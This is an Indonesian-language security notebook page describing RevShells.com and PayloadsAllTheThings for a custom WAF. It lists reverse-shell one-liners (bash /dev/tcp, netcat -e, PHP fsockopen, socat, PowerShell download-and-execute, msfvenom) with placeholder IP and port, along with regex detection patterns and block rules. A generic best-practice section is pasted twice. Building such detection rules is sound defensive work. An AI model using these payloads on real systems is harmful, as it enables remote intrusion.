---
title: "Reverse Shell Generator & PayloadsAllTheThings — Referensi Web Security Payload"
tags:
  - cyber-security
  - payload
  - reverse-shell
  - pentest
  - web-security
  - reference
aliases:
  - "RevShells & PayloadsAllTheThings"
  - "Swisskyrepo PAT"
  - "Reverse Shell Reference"
created: "2026-07-28"
updated: "2026-07-28"
status: pending
cssclasses:
  - wide-table
---

> [!info] Sumber Daya
> **RevShells.com** — Reverse Shell Generator online: tool interaktif untuk generate payload reverse shell dalam berbagai format (bash, Python, PHP, Netcat, MSFVenom, socat, telnet, dll). **PayloadsAllTheThings** — Repositori GitHub komprehensif berisi payload dan teknik bypass untuk web application security testing. Keduanya adalah referensi penting untuk memahami attack surface yang harus dideteksi oleh WAF.

**Cross-link:** [[ctf-tool-arsenal-universal]] → [[web-hacking-exploitation]] → [[waf-reverse-proxy-deepdive]] → [[command-injection]] → [[exploit-development]] → [[hierarchy-offensive]]

---

## RevShells.com

### URL
[https://www.revshells.com/](https://www.revshells.com/)

### Deskripsi
Generator reverse shell online yang menyediakan payload dalam 20+ format berbeda. Cukup masukkan IP dan port, pilih tipe shell, dan dapatkan command siap pakai.

### Format Payload yang Tersedia

| Kategori | Contoh | Deteksi WAF |
|---|---|---|
| **Bash** | `bash -i >& /dev/tcp/IP/PORT 0>&1` | Base64 encoded version lebih sulit dideteksi |
| **Python** | `python -c 'import socket...'` | `socket`, `subprocess`, `pty` dalam body |
| **PHP** | `php -r '$sock=fsockopen(IP,PORT);...'` | `fsockopen`, `exec`, `shell_exec` |
| **Netcat** | `nc -e /bin/sh IP PORT` | `nc -e`, `ncat` |
| **PowerShell** | `powershell -NoP -NonI -W Hidden -Exec Bypass -Command ...` | `-EncodedCommand`, `IEX`, `DownloadString` |
| **MSFVenom** | `msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf` | Binary payload — harder to detect via regex |
| **Socat** | `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:IP:PORT` | `socat` + `exec` + TCP/UDP |
| **Telnet** | `telnet IP PORT | /bin/bash | telnet IP PORT` | `telnet` dengan pipe |

### Pola Deteksi untuk WAF

```regex
# Bash reverse shell
bash.*/dev/tcp/|bash.*/dev/udp/
# Python reverse shell
python.*socket.*connect|python.*subprocess.*bash|python.*pty.*spawn
# PHP reverse shell
fsockopen\s*\(|php.*exec.*sh|php.*shell_exec
# Netcat
\bnc\b.*\-e\s*/bin/|ncat.*--exec
# PowerShell encoded
-EncodedCommand\s|IEX\s*\(.*New-Object.*Net.*WebClient
# Socat
socat.*exec.*tcp
```

---

## PayloadsAllTheThings

### URL
[https://github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

### Deskripsi
Repositori komprehensif (79.5K stars) berisi payload dan teknik bypass untuk penetration testing web. Setiap kategori memiliki README.md, file untuk Burp Intruder, dan gambar penjelasan.

### Struktur Kategori

| Kategori | Relevansi WAF | Implementasi di WAF |
|---|---|---|
| **SQL Injection** | Tinggi — berbagai teknik bypass filter | `src/rules/sql_injection.rs` |
| **Command Injection** | Tinggi — OOB, blind, encoded | `src/rules/body.rs` (CMDI-001/002) |
| **XSS Injection** | Tinggi — polyglot, dom-based | `src/rules/evasion.rs` |
| **File Inclusion (LFI/RFI)** | Tinggi — path traversal + wrapper | `src/rules/headers.rs` |
| **Server Side Request Forgery** | Sedang — SSRF via URL parsing | `src/rules/api.rs` |
| **Server Side Template Injection** | Tinggi — RCE via template engine | `src/rules/body.rs` (SSTI-001/002) |
| **Reverse Proxy Misconfig** | Tinggi — smuggling, bypass | `src/rules/body.rs` (SMUGGLE-001/002) |
| **Upload Insecure Files** | Tinggi — webshell, extension bypass | `src/rules/body.rs` (UPLOAD-001/002/003) |
| **XXE Injection** | Tinggi — blind OOB XXE | `src/rules/body.rs` (XXE-001/002) |
| **JWT Attacks** | Sedang — alg confusion, kid injection | `src/rules/api_security.rs` |
| **Prototype Pollution** | Rendah — JavaScript-specific | Belum ada |
| **NoSQL Injection** | Sedang — MongoDB payload | Belum ada |
| **GraphQL Injection** | Sedang — introspection, batching | `src/rules/graphql.rs` |
| **Web Cache Deception** | Rendah | Belum ada |

### Implementasi di WAF

#### Reverse Shell Detection — Baru

Berdasarkan pola dari RevShells.com dan PayloadsAllTheThings, rule baru untuk deteksi reverse shell:

```rust
static REVSHELL_BASH: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)(bash.*\/dev\/tcp\/|bash.*\/dev\/udp\/)"#).unwrap()
});

static REVSHELL_PYTHON: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)(python.*socket\.(SOCK_STREAM|connect)|python.*subprocess\..*(bash|sh|cmd)|pty\.spawn)"#).unwrap()
});

static REVSHELL_PHP: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)(fsockopen\s*\(|php.*exec\s*\(.*(bash|sh)|shell_exec\s*\(.*(bash|sh))"#).unwrap()
});

static REVSHELL_POWERSHELL: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)(-EncodedCommand\s|IEX\s*\(.*New-Object.*Net\.(WebClient|WebRequest)|DownloadString\s*\(.*(bash|sh|exe|ps1))"#).unwrap()
});
```

### Rule Plan untuk WAF

```yaml
# plugins/revshell-rules.toml (custom rule format)
[[rule]]
id = "REVSHELL-001"
name = "Reverse Shell — Bash /dev/tcp"
phase = "body"
action = "block"
severity = "critical"
description = "Detect Bash reverse shell using /dev/tcp or /dev/udp"
condition_type = "body"
operator = "regex"
condition_value = "(?i)(bash.*\\/dev\\/tcp\\/|bash.*\\/dev\\/udp\\/)"

[[rule]]
id = "REVSHELL-002"
name = "Reverse Shell — Python socket/subprocess"
phase = "body"
action = "block"
severity = "critical"
description = "Detect Python reverse shell via socket or subprocess"
condition_type = "body"
operator = "regex"
condition_value = "(?i)(python.*socket\\.(SOCK_STREAM|connect)|pty\\.spawn|subprocess\\..*(bash|sh))"

[[rule]]
id = "REVSHELL-003"
name = "Reverse Shell — PHP fsockopen/exec"
phase = "body"
action = "block"
severity = "critical"
description = "Detect PHP reverse shell via fsockopen or exec"
condition_type = "body"
operator = "regex"
condition_value = "(?i)(fsockopen\\s*\\(|shell_exec\\s*\\(.*(bash|sh))"
```

### Checklist Integrasi WAF

- [ ] Reverse shell patterns (bash, python, php, powershell, netcat)
- [ ] Webshell detection
- [ ] SSRF patterns from PAT
- [ ] NoSQL injection
- [ ] Prototype pollution
- [ ] WebSocket attack detection

---

## Referensi

- RevShells.com: [https://www.revshells.com/](https://www.revshells.com/)
- PayloadsAllTheThings: [https://github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- WAF kustom: repo lokal privat

**Cross-link vault:**
- [[waf-reverse-proxy-deepdive]] — arsitektur WAF
- [[ctf-tool-arsenal-universal]] — tool arsenal
- [[hierarchy-waf-reverse-proxy]] — WAF ontology

## Deepdive Tambahan — Implementasi & Operasional

### Arsitektur & Komponen Detail

Sistem ini memiliki beberapa komponen yang saling bergantung. Pemahaman arsitektur end-to-end penting untuk identifikasi attack surface dan gap pertahanan.

| Komponen | Fungsi | Attack Surface | Defense |
|----------|--------|---------------|---------|
| **Input** | Data mentah masuk | Injection, poisoning | Validate, sanitize |
| **Processing** | Core logic | Logic flaw, bypass | Test, review |
| **Output** | Result delivery | Leak, manipulation | Encrypt, audit |
| **Storage** | Persist data | Exfil, tamper | Encrypt, RBAC |
| **Network** | Transit | Intercept, MITM | TLS, mTLS |
| **Identity** | Access control | Token theft, privesc | MFA, least privilege |

### Workflow End-to-End

```
Input → Validate → Process → Store → Serve → Monitor → Audit
  ↓       ↓         ↓         ↓       ↓        ↓        ↓
Sanitize  Auth     Logic    Encrypt  RBAC    Alert    Log
```

### Tradeoff & Decision Matrix

| Dimension | Pilihan A | Pilihan B | Factor |
|-----------|-----------|-----------|--------|
| Speed vs Security | Optimized | Strict validate | Risk context |
| Memory vs Scale | In-memory | Disk-backed | Data volume |
| Cost vs Control | Cloud managed | Self-hosted | Team capability |
| Convenience vs Audit | Auto | Manual review | Compliance |

### Best Practice Checklist

- [ ] Input validation (whitelist, not blacklist)
- [ ] Output encoding (context-aware: HTML, JS, CSS)
- [ ] Authentication (MFA, rate limit, lockout)
- [ ] Authorization (RBAC, least privilege, deny default)
- [ ] Logging (structured, immutable, centralized)
- [ ] Monitoring (latency, error, saturation, traffic)
- [ ] Encryption (transit TLS, rest AES, key rotation)
- [ ] Backup (test restore, offsite, immutable)
- [ ] Patch (automated scan, SLA per severity)
- [ ] Incident (runbook, contact, tabletop)

### Common Pitfall

1. **Assume input trusted**: Semua input adalah musuh → validate di server.
2. **Secret in code**: Hardcoded credential → git leak → compromise.
3. **Silent failure**: Error ditelan → debugging impossible → security blind.
4. **No rate limit**: Abuse path → DoS → resource exhaustion.
5. **Default config**: Default = insecure → harden sebelum produksi.

### Tool Stack

| Tool | Use |
|------|-----|
| Testing | Burp Suite, OWASP ZAP, ffuf |
| Scanning | Nmap, Nuclei, Trivy |
| Monitoring | Prometheus + Grafana |
| Logging | ELK / Loki |
| Secret | Vault / SOPS |

## Referensi
- OWASP Top 10 — https://owasp.org/www-project-top-ten/
- NIST CSF — https://www.nist.gov/cyberframework
- MITRE ATT&CK — https://attack.mitre.org/
- CIS Controls — https://www.cisecurity.org/controls/

## Deepdive Tambahan — Implementasi & Operasional

### Arsitektur & Komponen Detail

Sistem ini memiliki beberapa komponen yang saling bergantung. Pemahaman arsitektur end-to-end penting untuk identifikasi attack surface dan gap pertahanan.

| Komponen | Fungsi | Attack Surface | Defense |
|----------|--------|---------------|---------|
| **Input** | Data mentah masuk | Injection, poisoning | Validate, sanitize |
| **Processing** | Core logic | Logic flaw, bypass | Test, review |
| **Output** | Result delivery | Leak, manipulation | Encrypt, audit |
| **Storage** | Persist data | Exfil, tamper | Encrypt, RBAC |
| **Network** | Transit | Intercept, MITM | TLS, mTLS |
| **Identity** | Access control | Token theft, privesc | MFA, least privilege |

### Workflow End-to-End

```
Input → Validate → Process → Store → Serve → Monitor → Audit
  ↓       ↓         ↓         ↓       ↓        ↓        ↓
Sanitize  Auth     Logic    Encrypt  RBAC    Alert    Log
```

### Best Practice Checklist

- [ ] Input validation (whitelist, not blacklist)
- [ ] Output encoding (context-aware: HTML, JS, CSS)
- [ ] Authentication (MFA, rate limit, lockout)
- [ ] Authorization (RBAC, least privilege, deny default)
- [ ] Logging (structured, immutable, centralized)
- [ ] Monitoring (latency, error, saturation, traffic)
- [ ] Encryption (transit TLS, rest AES, key rotation)
- [ ] Backup (test restore, offsite, immutable)
- [ ] Patch (automated scan, SLA per severity)
- [ ] Incident (runbook, contact, tabletop)

### Common Pitfall

1. **Assume input trusted**: Semua input adalah musuh → validate di server.
2. **Secret in code**: Hardcoded credential → git leak → compromise.
3. **Silent failure**: Error ditelan → debugging impossible → security blind.
4. **No rate limit**: Abuse path → DoS → resource exhaustion.
5. **Default config**: Default = insecure → harden sebelum produksi.

## Referensi
- OWASP Top 10 — https://owasp.org/www-project-top-ten/
- NIST CSF — https://www.nist.gov/cyberframework
- MITRE ATT&CK — https://attack.mitre.org/
- CIS Controls — https://www.cisecurity.org/controls/
